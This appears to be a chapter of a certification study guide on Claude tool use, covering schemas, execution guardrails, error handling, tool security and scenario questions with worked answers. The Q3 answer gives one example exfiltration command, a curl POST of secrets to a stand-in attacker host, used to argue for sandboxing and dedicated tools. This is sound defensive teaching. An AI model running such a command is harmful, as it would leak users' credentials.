# 05 — Tool Use

> **Domain mapping:** Domain 2 — *Tool Design & MCP Integration* — **18%**. The blueprint explicitly names
> **effective tool schemas** and **structural `isError` flags**. Tool use is also the mechanical basis of
> Domain 1 (agentic architecture, 27%), so this section is worth more than 18% in practice.

---

## 5.1 Tool calling fundamentals

### 5.1.1 What a tool actually is **[Claude-specific mechanics, general concept]**

A tool is **a JSON-Schema-described function that you declare to the model and that you execute yourself.**

The single most important thing to internalise: **Claude never executes anything.** It emits a `tool_use`
content block — a structured *request*. Your harness decides whether to honour it, executes it, and returns a
`tool_result`. Every security control you will ever build lives in that gap.

```
   You                          Claude                        Your code
    │  tools=[...]  ───────────────▶                              │
    │                            reasons                          │
    │  ◀───── tool_use{id, name, input} ─────                     │
    │  ── validate ── authorise ── execute ──────────────────────▶│
    │  ◀──────────────────────── result ──────────────────────────┤
    │  tool_result{tool_use_id, content, is_error?} ──▶           │
    │                            continues                        │
```

### 5.1.2 Why tools are needed

| Model limitation | Tool that fixes it |
|---|---|
| Knowledge cutoff | Web search, RAG retrieval, API lookup |
| No access to your data | Database / CRM / ticketing tools |
| Cannot perform side effects | `send_email`, `create_ticket`, `issue_refund` |
| Unreliable arithmetic | Calculator, code execution |
| No real-time state | Inventory, pricing, status APIs |
| Cannot verify its own output | Test runner, linter, validator |

### 5.1.3 Tool definition anatomy

```json
{
  "name": "get_order_status",
  "description": "Retrieve the current status and shipping details for a single order by its ID. Call this whenever the user asks where their order is, whether it shipped, or when it will arrive. Do NOT call this to search for orders — use search_orders when you do not have an exact order ID.",
  "input_schema": {
    "type": "object",
    "properties": {
      "order_id": {
        "type": "string",
        "description": "The order ID exactly as the customer provided it, e.g. 'ORD-44718'. Do not invent or reformat it."
      },
      "include_history": {
        "type": "boolean",
        "description": "Include the full status history. Default false; set true only when the user asks about past status changes."
      }
    },
    "required": ["order_id"],
    "additionalProperties": false
  },
  "strict": true
}
```

Every element is load-bearing:

- **`name`** — how the model refers to the capability. Specific verbs beat nouns (`get_current_weather` beats
  `weather`).
- **`description`** — **this is prompt engineering, not documentation.** It is the primary signal for *when* to
  call. Be prescriptive about triggers *and* about non-triggers. On recent Opus models, which reach for tools
  more conservatively, adding explicit trigger conditions gives a measurable lift in should-call rate.
- **`input_schema`** — the argument contract. Per-property descriptions matter as much as types.
- **`required`** — mark only genuinely required parameters.
- **`strict: true`** — **[Claude-specific]** guarantees `tool_use.input` validates exactly. Requires
  `additionalProperties: false` and `required`.

### 5.1.4 `tool_choice`

| Value | Behaviour |
|---|---|
| `{"type": "auto"}` | Claude decides (default) |
| `{"type": "any"}` | Must use **at least one** tool |
| `{"type": "tool", "name": "x"}` | Must use **that** tool |
| `{"type": "none"}` | Must not use tools |

Any of these may also carry `"disable_parallel_tool_use": true`, forcing at most one tool per response. By
default Claude may request several in one turn.

**When to force.** Use `any`/`tool` when you have already decided the next step (a deterministic workflow step
that happens to be implemented as a tool). Use `none` when you want a summarisation turn with no further
actions. Otherwise leave it `auto` — forcing tools when the right answer is "just reply" causes spurious calls.

**When to disable parallel.** Only when your tools have ordering dependencies or shared mutable state you cannot
make safe. Disabling parallelism costs real latency, so fix the tools instead where you can.

### 5.1.5 The execution lifecycle

```python
messages = [{"role": "user", "content": user_input}]

for step in range(MAX_STEPS):                     # ALWAYS bound the loop
    r = client.messages.create(model=MODEL, max_tokens=16000,
                               tools=TOOLS, messages=messages,
                               thinking={"type": "adaptive"})

    if r.stop_reason == "max_tokens":  raise Truncated()
    if r.stop_reason == "refusal":     return refused(r.stop_details)
    if r.stop_reason == "pause_turn":  messages = resume(messages, r); continue
    if r.stop_reason != "tool_use":    return final(r)

    messages.append({"role": "assistant", "content": r.content})

    results = []
    for block in (b for b in r.content if b.type == "tool_use"):
        results.append(execute_with_guardrails(block))     # returns a tool_result dict
    messages.append({"role": "user", "content": results})  # ONE user message

raise StepLimitExceeded()
```

### 5.1.6 **[Claude-specific]** Tool Runner vs manual loop

The SDKs ship a **Tool Runner** (`client.beta.messages.tool_runner`) that drives this loop for you: it calls
the API, detects `tool_use`, executes your registered functions, feeds results back and repeats.

```python
from anthropic import Anthropic, beta_tool

@beta_tool
def get_order_status(order_id: str, include_history: bool = False) -> dict:
    """Retrieve status and shipping details for an order. Call when the user asks
    where their order is. Use search_orders if you do not have an exact ID."""
    return orders.fetch(order_id, history=include_history)

runner = client.beta.messages.tool_runner(
    model="claude-opus-5", max_tokens=16000,
    tools=[get_order_status], messages=messages, max_iterations=10,
)
final = runner.until_done()
```

**Default to the Tool Runner.** The common objection — "I need control for approval gates / logging / error
interception" — is wrong: each iteration yields the assistant message *before* the tools run, so you can gate,
inspect, modify results (e.g. add `cache_control`), retry a turn, or take over the message history. Streaming
and automatic compaction are supported.

Reach for a **manual loop** only when you want to own the entire loop: a custom transport, request shapes the
SDK cannot build, control flow that does not fit per-turn hooks, or when you would rather not take a beta
dependency.

> ⚠️ **Do not confuse the Tool Runner with the Claude Agent SDK.** The Tool Runner is part of the regular
> Anthropic SDK and loops over tools *you* define — no built-in tools, no filesystem, no sandbox. The
> **Claude Agent SDK** (`claude-agent-sdk`) is Claude Code packaged as a library: built-in Read/Write/Edit/Bash/
> Grep/WebSearch tools, subagents, hooks, permissions, sessions. Both are **harness-only — you host them**.
> **Managed Agents** is the third option: Anthropic runs the loop *and* hosts a per-session sandbox.

---

## 5.2 Tool design **[Officially named: "effective tool schemas"]**

### 5.2.1 Design principles

| Principle | Rationale |
|---|---|
| **Single purpose** | An ambiguous tool is selected ambiguously. One tool, one job. |
| **Right granularity** | Too fine → long chains, more chances to fail. Too coarse → the model must construct complex arguments it will get wrong. |
| **Model the user's intent, not your service boundaries** | `get_order_status` beats `query_service(service, method, payload)` |
| **Deterministic** | Same arguments → same result. Non-determinism makes retries and evaluation impossible to reason about. |
| **Fail informatively** | The error message is context the model uses to recover. |
| **Constrain the argument space** | Enums, formats, and `strict: true` beat free-text parameters. |
| **Idempotent when side-effecting** | Accept a caller-supplied idempotency key (§2.6.4). |

### 5.2.2 Writing descriptions that work

A tool description is read by a model deciding among alternatives. Structure it:

```
<what it does>. Call this when <explicit trigger conditions>.
Do not call this when <explicit non-triggers — name the competing tool>.
<returns / important semantics>.
```

```
❌ "Search the knowledge base."

✅ "Search the internal product knowledge base by semantic similarity and return the
    top 5 matching passages with source URLs. Call this whenever the user asks a
    factual question about product behaviour, pricing, or configuration that is not
    answered by the conversation so far. Do NOT call this for account-specific
    questions — use get_account_details instead. Returns [] when nothing matches;
    an empty result means the answer is not in the knowledge base, so say so rather
    than guessing."
```

That last sentence is doing real work: it tells the model what an empty result *means*, preventing the classic
"retrieval returned nothing so I'll make something up" failure.

### 5.2.3 Input and output schema design

**Input:**

```json
{
  "type": "object",
  "properties": {
    "status": {"type": "string", "enum": ["open", "pending", "closed"],
               "description": "Filter by status. Omit for all statuses."},
    "since":  {"type": "string", "format": "date",
               "description": "ISO 8601 date. Only orders on or after this date."},
    "limit":  {"type": "integer",
               "description": "Max results, 1-50. Use 10 unless the user asks for more."}
  },
  "required": [], "additionalProperties": false
}
```

Note: `limit` has no `minimum`/`maximum` in the schema (not supported) — the bound goes in the description
**and** in your server-side validation.

**Output:** the model sees the tool result as text. Design it for a reader:

```
❌ {"d":[{"i":4471,"s":2,"t":1718000000}], "c":1}

✅ {"orders": [{"order_id": "ORD-4471", "status": "shipped",
                "shipped_at": "2026-06-10", "carrier": "DHL",
                "tracking_url": "https://..."}],
    "total_matching": 1,
    "truncated": false}
```

Rules for tool output:
- **Self-describing keys.** Enum codes and epoch timestamps waste model effort and invite misreading.
- **Signal truncation explicitly.** `"truncated": true` prevents the model asserting completeness.
- **Bound the size.** A tool returning 200KB of JSON blows the context budget and buries the signal. Paginate,
  summarise, or return references. **[Claude Code-specific]** MCP tool output warns above 10,000 tokens and is
  limited to 25,000 by default (`MAX_MCP_OUTPUT_TOKENS`).
- **Strip secrets and PII** the model does not need. Tool output is context, and context is logged.

### 5.2.4 **[Claude-specific]** Tool-use examples

You can attach sample tool calls to a tool definition to demonstrate correct argument construction. This
measurably reduces parameter errors on complex schemas — reach for it before you reach for more prose in the
description.

### 5.2.5 Anthropic-defined tools

Some tools are defined by Anthropic and are **schema-less** — declare them by `type` and `name` only:

| Tool | Declaration | Side |
|---|---|---|
| Bash | `{"type": "bash_20250124", "name": "bash"}` | Client-executed |
| Text editor | `{"type": "text_editor_20250728", "name": "str_replace_based_edit_tool"}` | Client-executed |
| Code execution | `{"type": "code_execution_20260521", "name": "code_execution"}` | **Server**-executed |
| Web search | `{"type": "web_search_20260209", "name": "web_search"}` | Server |
| Web fetch | `{"type": "web_fetch_20260209", "name": "web_fetch"}` | Server |
| Memory | `{"type": "memory_20250818", "name": "memory"}` | Client-executed |

**Do not pass an `input_schema`** for these, and do not define a custom tool named `"bash"` — that creates a
different, user-defined tool without the built-in behaviour.

**Client-side vs server-side is an architecture decision:**

| | Client-side (bash, text editor, computer use, memory) | Server-side (code execution, web search/fetch) |
|---|---|---|
| Who runs it | You | Anthropic |
| You control | Sandbox, allowlists, audit, data residency | Nothing about execution |
| Ops burden | Yours | None |
| Data exposure | Stays in your environment | Leaves your environment |
| Use when | Regulated data, custom runtime, hard isolation needs | Speed to value, no infra appetite |

Server-side tool errors **do not raise** — they return HTTP 200 with an error object inside the result block
(e.g. `{"error_code": "max_uses_exceeded"}`). For web search, a success `content` is a *list* and an error
`content` is an *object* — branch on that before indexing.

---

## 5.3 Tool selection

### 5.3.1 How Claude decides

Selection is conditioned on: the tool `name`, the `description`, the property descriptions, the conversation so
far, the system prompt's tool policy, and the *set* of other tools available (they compete). There is no
registry lookup and no type system — it is pattern matching over descriptions.

### 5.3.2 Selection failure modes and fixes

| Failure | Cause | Fix |
|---|---|---|
| Calls the wrong tool | Overlapping descriptions | Add explicit non-triggers naming the competing tool |
| Calls no tool when it should | Description says *what*, not *when* | Add trigger conditions; consider `tool_choice: "any"` for that route |
| Calls a tool when it should answer directly | Over-eager triggers | Add "Answer from the conversation when the information is already present" |
| Hallucinates a tool name | Tool set changed mid-conversation, or too many tools | Keep the set stable; use tool search; the API rejects unknown names anyway |
| Wrong arguments | Loose schema, ambiguous names | `strict: true`, enums, formats, per-property descriptions, tool-use examples |
| Chains inefficiently | No guidance on composition | Document the intended sequence in the system prompt's tool policy |

### 5.3.3 Too many tools

Beyond roughly 15–25 tools, selection accuracy degrades and every request pays for all the schemas. Three
remedies:

| Remedy | Mechanism | Trade-off |
|---|---|---|
| **Reduce** | Merge overlapping tools; drop unused ones | Best first move; free |
| **Route** | Pick a tool subset per route/intent before the call | Deterministic, cheap; needs a router |
| **[Claude-specific] Tool search** | `tool_search_tool_regex_20251119` / `..._bm25_...` + `defer_loading: true` on the rest | Model discovers tools on demand; keeps the fixed prompt small |

**[Claude-specific]** Tool search **appends** discovered schemas rather than swapping them, which preserves the
prompt cache — this is why it is the right answer for "we have 200 tools and our cache hit rate collapsed".
Two hard rules: the search tool itself must not be deferred, and at least one tool must be non-deferred, or the
API returns `400 All tools have defer_loading set`.

**[Claude-specific]** *Mid-conversation tool changes* (beta, Opus 5+) solve a related but distinct problem: your
**application** decides the tool set changed (mode switch, capability revoked). Add/remove via `tool_addition` /
`tool_removal` blocks on a `{"role": "system"}` message; a tool you plan to add must already be declared with
`"defer_loading": true`. **Tool search = discovery by the model. Mid-conversation changes = control by you.**

### 5.3.4 Tool permissions

Tools should be scoped **per route, per user, per tenant** — not a single global set:

```python
def tools_for(request) -> list[dict]:
    tools = [SEARCH_KB, GET_ACCOUNT]                      # everyone
    if request.user.can("orders:read"):  tools.append(GET_ORDER)
    if request.user.can("orders:write"): tools.append(CANCEL_ORDER)
    if request.tenant.feature("refunds"): tools.append(ISSUE_REFUND)
    return tools
```

Two independent reasons this is right: **security** (a tool the model cannot see cannot be misused) and
**accuracy** (fewer tools ⇒ better selection). Note the caching cost: a per-user tool list changes the very
front of the prompt and destroys cache sharing. Mitigate by grouping users into a small number of **tool
profiles** (e.g. `reader`, `agent`, `admin`) so the prefix is shared within a profile.

---

## 5.4 Tool execution architecture

### 5.4.1 The execution wrapper

Never call the underlying function directly from the loop. Every tool call passes through the same pipeline:

```python
def execute_with_guardrails(block) -> dict:
    span = tracer.start(block.name, tool_use_id=block.id)
    try:
        spec = REGISTRY[block.name]                       # 1. known tool?
        args = spec.validate(block.input)                 # 2. re-validate server-side
        authorize(ctx.user, spec, args)                   # 3. authz on ARGUMENTS, not just tool
        if spec.destructive and not approved(ctx, spec, args):
            return err(block.id, "Awaiting human approval. Do not retry.")
        with timeout(spec.timeout_s):                     # 4. per-tool timeout
            out = spec.fn(**args, idempotency_key=block.id)   # 5. idempotency
        out = redact(truncate(out, spec.max_bytes))       # 6. bound + redact
        audit.write(ctx, block, out)                      # 7. audit trail
        return ok(block.id, out)
    except ToolError as e:
        return err(block.id, str(e))                      # is_error=True
    finally:
        span.end()
```

Seven controls, one place. This wrapper is the answer to a surprising number of scenario questions.

**Step 3 deserves emphasis:** authorising the *tool* is not enough. `get_order(order_id)` must check that
*this* user may read *that* order. Otherwise you have an IDOR vulnerability driven by a model that can be
influenced by untrusted text.

### 5.4.2 Parallel execution

Claude may emit several `tool_use` blocks in one response. Execute them **concurrently** when they are
independent — this is often the largest single latency win in an agent.

```python
async def run_all(blocks):
    results = await asyncio.gather(*(execute(b) for b in blocks), return_exceptions=True)
    return [to_tool_result(b, r) for b, r in zip(blocks, results)]
```

Then return **all** results in **one** user message. Splitting them across messages silently trains Claude to
stop parallelising.

Mark tools as parallel-safe or not. Read-only tools (`search`, `get_*`) are safe; write tools that touch shared
state generally are not, and you should either serialise them or make them commutative.

### 5.4.3 Multi-step chains and the token curve

Each step appends the assistant turn *and* the tool result to history. Ten steps with 2KB results each is
~5–10K extra tokens **resent on every subsequent step** — cost grows quadratically in steps.

Mitigations, in order of preference:
1. **Fewer, richer tools** — one `get_order_with_shipping` instead of three chained calls.
2. **[Claude-specific] Programmatic tool calling** — Claude writes a script in the code-execution container
   that invokes tools as functions; intermediate results stay in the script, and only the final output enters
   context. This is the purpose-built fix for "many sequential calls with large intermediate data".
3. **[Claude-specific] Context editing** — `clear_tool_uses_20250919` prunes stale tool results.
4. **Summarise-and-drop** — replace old results with a compact summary you generate.

---

## 5.5 Tool safety **[Also Domain: security]**

### 5.5.1 The threat model in one sentence

**Tool arguments are model output, and model output is influenced by untrusted input; therefore tool arguments
are untrusted input.**

Everything follows: validate them, authorise them, bound them, log them.

### 5.5.2 Controls

| Control | Implementation | Notes |
|---|---|---|
| **Authentication** | The agent runs as a service identity; the *user* identity is carried in request context | Never let the model supply the identity |
| **Authorisation** | Check on (user, tool, **arguments**) | Prevents IDOR via model-chosen IDs |
| **Least privilege** | Read-only by default; write tools added only where needed | The strongest control available |
| **Input validation** | Re-validate server-side even with `strict: true` | `strict` guarantees schema, not policy |
| **Output validation** | Schema + policy check before results reach the model or the user | Blocks exfiltration and leakage |
| **Bounded side effects** | Refund caps, rate limits, per-session budgets | Bounds blast radius when a control fails |
| **Human approval** | Gate irreversible actions | §12.6 |
| **Audit logging** | (who, session, tool, args, result hash, decision, timestamp) | Non-negotiable for regulated systems |
| **Sandboxing** | Containers/VMs, network egress allowlists, read-only mounts | Essential for `bash`/code execution |

### 5.5.3 Bash is a capability, not a tool

**[Claude-specific] guidance:** a `bash` tool gives Claude enormous leverage — and gives your harness only an
opaque command string, identical in shape for every action. Promoting an action to a **dedicated tool** gives
the harness typed arguments it can intercept, gate, render, audit, and parallelise.

Promote when you need to:
- **Gate** — hard-to-reverse actions (`send_email` is easy to gate; `bash -c "curl -X POST …"` is not).
- **Enforce an invariant** — a dedicated `edit` tool can reject a write if the file changed since the last read;
  bash cannot.
- **Render** — actions that need custom UI (Claude Code promotes question-asking to a tool so it can render a
  modal and block the loop).
- **Parallelise** — read-only tools can be marked parallel-safe; through bash the harness cannot distinguish a
  safe `grep` from an unsafe `git push`, so it must serialise everything.

**Rule of thumb: start with bash for breadth; promote to dedicated tools when you need to gate, render, audit,
or parallelise.**

If you must ship bash: run it in an isolated environment, apply an **allowlist** of permitted executables,
reject shell operators (`&&`, `|`, `;`, backticks, `$()`), set timeouts and resource limits, and log every
command. **A blocklist is not sufficient** — there are always more ways to spell an operation than you can
enumerate.

Similarly, for the text editor tool, `path` is untrusted model output: resolve it to canonical form and verify
it stays inside your project root; reject `..`, symlink escapes, absolute paths, and URL-encoded traversal.

---

## 5.6 Tool failure handling **[Officially named: structural `isError` flags]**

### 5.6.1 The `is_error` contract

```json
{
  "type": "tool_result",
  "tool_use_id": "toolu_01ABC...",
  "content": "Order lookup timed out after 30s. The order service is currently degraded. You may inform the user and offer to retry, or continue with information already gathered. Do not retry this call immediately.",
  "is_error": true
}
```

Three rules:
1. **A failed tool still returns a `tool_result`.** Dropping it is a 400.
2. **Set `is_error: true`.** This is a *structural* flag the model reads — not a convention encoded in prose.
3. **The message is recovery context.** Include what failed, whether it is transient, and what the model should
   do. "Error" teaches nothing; the example above teaches four useful things.

### 5.6.2 Error taxonomy and handling

| Class | Example | Handle where | Message to model |
|---|---|---|---|
| **Invalid arguments** | Order ID format wrong | Return to model | State the expected format — the model can fix this itself |
| **Not found** | Order does not exist | Return to model | "No order with that ID" — this is *information*, arguably not even an error |
| **Permission denied** | User lacks scope | Return to model | "You are not permitted to do this" — **never** leak whether the resource exists |
| **Transient (timeout, 5xx)** | Downstream degraded | Retry **in your code** first (with backoff); surface only after exhaustion | Say it is transient |
| **Rate limited** | Downstream 429 | Retry with backoff in code | Say retrying will not help right now |
| **Business rule violation** | Refund exceeds policy cap | Return to model | State the rule so the model can propose an alternative |
| **Fatal / misconfiguration** | Tool not registered | Fail the request | Do not loop |

**The key architectural distinction:** *retryable infrastructure failures are your harness's job*; *semantic
failures are the model's job*. Do not ask the model to implement exponential backoff by calling the tool again —
it has no timer, it will retry immediately, and you will pay for a full model turn per retry.

### 5.6.3 Partial failure

Three of five parallel tools succeeded: return **all five** results, two with `is_error: true`, and let the
model decide whether it can proceed. This is usually better than aborting: the model frequently can complete
the task with partial evidence, and if it cannot, it will say so.

### 5.6.4 Loop protection

| Guard | Implementation |
|---|---|
| **Max iterations** | Hard cap (10–25 typical). Non-negotiable. |
| **Repeat detection** | Hash (tool name + normalised args); after N identical calls, inject "You have called X with these arguments N times with the same result. Try a different approach or ask the user." |
| **Budget** | Track tokens and dollars per session; abort at the ceiling |
| **Wall clock** | Overall deadline |
| **No-progress detection** | If K consecutive steps produce no new information, stop |

---

## 5.7 Tool design trade-offs

### 5.7.1 One large tool vs many small tools

| | Few coarse tools | Many fine tools |
|---|---|---|
| Selection accuracy | ✅ Easier to choose | ❌ More confusion |
| Argument complexity | ❌ Complex nested args, more argument errors | ✅ Simple args |
| Steps per task | ✅ Fewer round trips → cheaper, faster | ❌ Long chains, quadratic token growth |
| Authorisation granularity | ❌ Coarse — hard to scope per user | ✅ Fine — natural permission boundaries |
| Reusability / composition | ❌ Rigid | ✅ Composable |
| Testability | ❌ Many code paths per tool | ✅ Small units |

**Default:** medium granularity — one tool per *user-visible intent*, not per HTTP endpoint and not per
subsystem. `get_order_status` (which internally joins order + shipment + carrier) is the right size;
`http_request(url, method, body)` is too coarse (no authz granularity, unbounded blast radius, terrible
argument accuracy) and `get_order_row` / `get_shipment_row` / `get_carrier_row` is too fine.

> **Why would an architect choose the coarse tool anyway?** When latency dominates and the composition is
> fixed. Three sequential calls cost three model round trips (~2–6s). One composite tool costs one. If the
> composition never varies, encode it in the tool.
>
> **Why the fine-grained set?** When authorisation differs per element (a user may read shipments but not
> payment details) — the tool boundary must align with the permission boundary or you cannot enforce it.

### 5.7.2 Deterministic workflow vs model-driven tools

| | Deterministic workflow | Model-driven tool use |
|---|---|---|
| Control flow | Your code | The model |
| Predictability | ✅ Total | ❌ Varies per run |
| Handles novelty | ❌ Only what you coded | ✅ Adapts |
| Cost | ✅ Known | ❌ Variable |
| Debuggability | ✅ Stack traces | ❌ Trajectory analysis |
| Auditability | ✅ Trivially | ❌ Requires tracing |

**Default to deterministic.** Use model-driven tool use only where the *sequence genuinely cannot be known in
advance*. The most common production shape is a **deterministic skeleton with LLM steps inside it** — a
workflow, not an agent (§09.11, §16.2).

### 5.7.3 Read-only vs write tools

Split them, deliberately:

```
Phase 1: read-only tools  → gather evidence → produce a PLAN (structured output)
Phase 2: human/policy gate → validate the plan
Phase 3: write tools      → execute the approved plan deterministically
```

This is the **plan-then-execute** pattern and it is the single most useful safety structure for agents with side
effects. It makes the dangerous step reviewable, auditable, and replayable — and it means an injected agent
produces a *bad plan that gets rejected*, rather than a bad action that already happened.

### 5.7.4 Synchronous vs asynchronous tools

Anything over ~30s should not block the model turn. Return a handle instead:

```json
{"job_id": "job_88f2", "status": "running", "poll_with": "get_job_status",
 "estimated_seconds": 300}
```

The agent can then do other work and poll, or the session can suspend and resume on a webhook. **[Claude
Code-specific]** an MCP tool call in the main conversation that is still running after two minutes is
automatically moved to a background task, and the result arrives as a task notification — a good model for how
to design this yourself.

---

## Key takeaways

- Claude requests; **your harness executes**. Every control lives in that gap.
- Tool descriptions are prompt engineering: be prescriptive about **when** to call and **when not to**.
- `strict: true` goes on the tool definition and requires `additionalProperties: false` + `required`.
- All parallel `tool_result`s in **one** user message; failures included with `is_error: true` and an
  informative, recovery-oriented message.
- Retryable infrastructure errors are the harness's job; semantic errors are the model's job.
- Authorise on **arguments**, not just on the tool.
- Bash is a capability; promote actions to dedicated tools when you need to gate, render, audit or parallelise.
- Default granularity: one tool per user-visible intent. Split read from write and gate the write phase.

## Things to memorise

- The four `tool_choice` values plus `disable_parallel_tool_use`.
- The `is_error` contract (three rules).
- Anthropic-defined tools are schema-less; never pass `input_schema`.
- Tool search preserves the cache (appends); mid-conversation tool changes are application-driven.
- `400 All tools have defer_loading set` — at least one tool and the search tool must stay loaded.
- Tool Runner ≠ Claude Agent SDK ≠ Managed Agents.

## Common mistakes

- Returning an exception to the caller instead of a `tool_result` with `is_error: true`.
- Splitting parallel tool results across multiple user messages.
- Authorising the tool but not the arguments (IDOR).
- Implementing retry by asking the model to call the tool again.
- Giving an agent `bash` when three dedicated tools would do.
- Unbounded tool loops with no repeat detection or budget.
- Defining a custom tool named `bash`.

---

## Scenario questions

**Q1.** An agent has `search_orders(query)` and `get_order(order_id)`. It repeatedly calls `search_orders` with
an exact order ID and gets zero results. Diagnose and fix.

<details><summary>Answer</summary>

**Tool-selection failure caused by descriptions that say *what* rather than *when*.** The model has no signal
distinguishing the two tools.

Fixes, in order:
1. Rewrite both descriptions with explicit triggers **and non-triggers** that name the sibling tool:
   `get_order` — "Call when you have an exact order ID (format ORD-NNNNN). Do NOT use search_orders for an exact
   ID."; `search_orders` — "Call only when you do not have an exact ID — e.g. searching by customer email or
   date range. Do NOT call with an order ID."
2. Make `search_orders` **fail informatively**: when the query matches the order-ID pattern, return
   `is_error: true` with "That looks like an order ID — use get_order instead." The model corrects itself in
   one turn, and you get a metric for how often it happens.
3. Add `format`/description hints on `order_id`.
4. Consider merging into a single `find_order(order_id?, email?, date_range?)` if the distinction keeps costing
   turns.

Instrument tool-selection accuracy as a first-class eval metric (§11.5).
</details>

**Q2.** A refund agent calls `issue_refund`. The HTTP call times out after 45s but the refund actually
succeeded. The harness returns `is_error: true`; the model retries; the customer is refunded twice. Fix.

<details><summary>Answer</summary>

The root cause is **non-idempotent side effects under at-least-once delivery**, not the retry itself.

1. **Idempotency key.** `issue_refund` must accept a caller-supplied key — use the `tool_use_id`, which is
   stable for that specific tool call. The payment provider then deduplicates. This is the fix.
2. **Do not let the model own retries of side-effecting tools.** On timeout, the harness should first
   *reconcile* — query the provider for a refund with that idempotency key — and return the true state.
3. **Error message discipline.** If you must return an error, say "the request timed out and the outcome is
   unknown; do not retry — a reconciliation job will resolve it."
4. **Bound the blast radius**: per-session refund caps, and human approval above a threshold.
5. **Audit** every attempt with the idempotency key so double-payments are detectable.

The generalisable rule: **every side-effecting tool takes an idempotency key derived from `tool_use_id`.**
</details>

**Q3.** A coding agent has one tool: `bash(command)`. Security review rejects it. Propose a design that keeps
capability but adds control.

<details><summary>Answer</summary>

The problem is that bash gives the harness an opaque string — the same shape for `ls` and for
`curl -X POST attacker.com --data @secrets`. You cannot gate, render, audit or parallelise on it.

Design:
1. **Promote high-value actions to dedicated tools**: `read_file(path)`, `edit_file(path, old, new)`,
   `run_tests(suite)`, `git_commit(message)`, `search_code(pattern)`. Typed arguments make each one gateable
   and auditable, and read-only ones can be marked parallel-safe.
2. **Enforce invariants only a dedicated tool can**: `edit_file` rejects a write when the file changed since the
   agent last read it (a staleness check bash cannot do).
3. **Keep a narrow `bash`** for the long tail, but sandboxed: container with no credentials, read-only mounts
   outside the workspace, **egress allowlist**, executable allowlist, rejection of shell operators, timeouts,
   resource limits, and full command logging.
4. **Gate the irreversible actions** — `git_push`, `deploy` — behind human approval.
5. **Path safety** on every file tool: canonicalise and verify containment in the project root.

In Claude Code terms this is exactly the permission model: `deny` rules for dangerous commands, `allow` rules
for known-safe ones, PreToolUse hooks for policy, plus sandboxing for OS-level enforcement.
</details>

**Q4.** An agent has 60 tools from 5 MCP servers. Latency is high, cost is up 3×, and the model picks wrong
tools ~15% of the time. Prompt caching shows near-zero hits. Fix.

<details><summary>Answer</summary>

Three separate problems with three different fixes.

1. **Cost and near-zero cache hits.** 60 schemas render first in the prompt; if the tool list is assembled
   non-deterministically (set iteration, per-user filtering) the prefix changes every request and nothing
   caches. Fix: sort the tool list deterministically, and group users into a few **tool profiles** so the prefix
   is shared. Verify with `usage.cache_read_input_tokens`.
2. **Selection accuracy at 60 tools.** Reduce first — audit usage and delete tools that are never called; merge
   overlapping ones. Then **route**: select a tool subset per intent before the call. Then rewrite descriptions
   with explicit non-triggers.
3. **Scaling beyond what reduction can fix.** Enable **tool search** with `defer_loading: true` on the long
   tail. It keeps the fixed prompt small and — importantly — *appends* discovered schemas rather than swapping
   them, so the cached prefix survives. Remember at least one tool and the search tool itself must stay
   non-deferred.

Measure tool-selection accuracy on a labelled trajectory eval set so you can prove the improvement.
</details>

**Q5.** An engineer proposes exposing your public REST API to the model as a single tool:
`api_call(method, path, body)`. Evaluate.

<details><summary>Answer</summary>

Reject it. It fails on every axis that matters:

- **Security.** Unbounded blast radius — any endpoint, any method. Authorisation cannot be expressed
  meaningfully ("may the model call `api_call`?" is not a useful question), so you cannot enforce
  least privilege or gate destructive operations.
- **Accuracy.** The model must construct paths and bodies from memory of your API. Argument errors will be
  frequent, and `strict: true` cannot help because the schema is `{method, path, body}` — structurally valid,
  semantically arbitrary.
- **Observability.** Every action looks identical in traces and audit logs.
- **Errors.** One error surface for 50 endpoints; you cannot give tailored recovery guidance.
- **Parallelism.** The harness cannot tell a safe GET from an unsafe DELETE, so it must serialise.

Correct design: expose ~5–15 tools modelled on **user intents**, each with a tight schema, enums, explicit
triggers/non-triggers, per-tool authorisation, per-tool error semantics, and read/write separation with the
write phase gated. If the API is genuinely huge, put it behind an MCP server that exposes a curated subset and
use tool search — but curate, do not proxy.
</details>

**Q6.** A research agent chains 12 tool calls; each returns ~4KB of JSON. By step 10 responses degrade and cost
per task is 8× the estimate. Explain the mechanism and give three fixes ranked by impact.

<details><summary>Answer</summary>

**Mechanism:** history grows monotonically and is resent every step. Twelve steps × ~4KB results ≈ 12–15K tokens
of tool output, plus assistant turns, all re-billed on each subsequent call — roughly quadratic in steps. The
context also becomes noise-dominated, so the *quality* degradation is lost-in-the-middle, not a model defect.

Ranked fixes:
1. **[Claude-specific] Programmatic tool calling.** Claude writes a script in the code-execution container that
   calls the tools as functions; intermediate results stay in the script and only the final output enters
   context. Purpose-built for exactly this shape — usually the biggest single win.
2. **Redesign the tools.** Twelve calls suggests too-fine granularity. Composite tools that do the join
   server-side cut both steps and payload. Also bound and shape the output: return the 6 fields the model needs,
   not the full record, and signal truncation.
3. **[Claude-specific] Context editing** (`clear_tool_uses_20250919`) to prune stale results, and/or compaction
   for long sessions. Cheap to enable, no redesign required.

Then: cap iterations, add a per-task token budget, and consider a subagent whose separate context holds the
verbose work while only a summary returns to the main loop (§09.6).
</details>
